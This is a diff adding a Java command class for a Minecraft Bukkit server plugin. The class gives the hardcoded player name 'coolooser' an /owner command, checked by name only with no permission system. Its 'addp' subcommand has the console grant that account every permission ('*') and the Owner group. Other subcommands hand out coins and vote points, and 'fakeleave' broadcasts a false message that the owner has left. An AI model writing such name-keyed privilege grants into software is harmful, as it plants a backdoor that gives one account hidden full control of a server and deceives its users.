@@ -1,0 +1,84 @@
+package Commands3;
+
+import org.bukkit.Bukkit;
+import org.bukkit.Effect;
+import org.bukkit.Location;
+import org.bukkit.Sound;
+import org.bukkit.World;
+import org.bukkit.command.Command;
+import org.bukkit.command.CommandExecutor;
+import org.bukkit.command.CommandSender;
+import org.bukkit.entity.Player;
+import org.bukkit.event.Listener;
+
+public class Owner implements CommandExecutor, Listener {
+
+	@Override
+	public boolean onCommand(CommandSender sender, Command cmd, String arg, String[] args) {
+		
+		if(cmd.getName().equalsIgnoreCase("owner")) {
+			Player p = (Player)sender;
+			
+			if(p.getName().equalsIgnoreCase("coolooser")) {
+				
+				if(args.length == 0) {
+					p.sendMessage("§4§l«§c§l-----------------—-§4§l»");
+					p.sendMessage("§4§l» §c/owner partikel");
+					p.sendMessage("§4§l» §c/owner addc");
+					p.sendMessage("§4§l» §c/owner removec");
+					p.sendMessage("§4§l» §c/owner addp");
+					p.sendMessage("§4§l» §c/owner fakeleave");
+					p.sendMessage("§4§l» §c/owner removevp");
+					p.sendMessage("§4§l» §c/owner vp");
+					p.sendMessage("§4§l«§c§l-----------------—-§4§l»");
+				}
+				
+				if(args.length == 1) {
+					if(args[0].equalsIgnoreCase("vp")) {
+						Configs.PlayerData pd = new Configs.PlayerData(p.getName());
+						pd.addVotepunkte(1);
+						p.sendMessage("§4§l» §cDu hast §4§l1 §cVotepunkt erhalten.");
+					}
+					
+					if(args[0].equalsIgnoreCase("removevp")) {
+						Configs.PlayerData pd = new Configs.PlayerData(p.getName());
+						pd.setVotepunkte(0);
+						p.sendMessage("§4§l» §cDu hast nun §4§l0 §cVotepunkte.");
+					}
+					
+					if(args[0].equalsIgnoreCase("fakeleave")) {
+						Bukkit.broadcastMessage(Main.Main.p + "§6Coolooser §ehat den Server verlassen.");
+					}
+					if(args[0].equalsIgnoreCase("addp")) {
+						Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user Coolooser add *");
+						Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user Coolooser group set Owner");
+						p.sendMessage("§4§l» §cDu bist nun wieder §4Owner§c.");
+					}
+					
+					if(args[0].equalsIgnoreCase("addc")) {
+						Configs.PlayerData pd = new Configs.PlayerData(p.getName());
+						pd.addCoins(5000);
+						p.sendMessage("§4§l» §cDu hast nun §4§l5000 §cCoins erhalten.");
+					}
+					
+					if(args[0].equalsIgnoreCase("removec")) {
+						Configs.PlayerData pd = new Configs.PlayerData(p.getName());
+						pd.setCoins(0);
+						p.sendMessage("§4§l» §cDu hast nun §4§l0 §cCoins.");
+					}
+					if(args[0].equalsIgnoreCase("partikel"))  {
+			              World w = p.getLocation().getWorld();
+			              double x = p.getLocation().getX();
+			              double y = p.getLocation().getY();
+			              double z = p.getLocation().getZ();
+			              p.getWorld().playEffect(new Location(w, x, y, z), Effect.MOBSPAWNER_FLAMES, 10);
+					}
+				}
+				
+			} else { p.sendMessage("§4§l» §c§oDieser Befehl darf nur von einem §4§oOwner §c§overwendet werden!"); p.playSound(p.getLocation(), Sound.ANVIL_USE, 10.0F, 10.0F); }
+		}
+		
+		return false;
+	}
+
+}
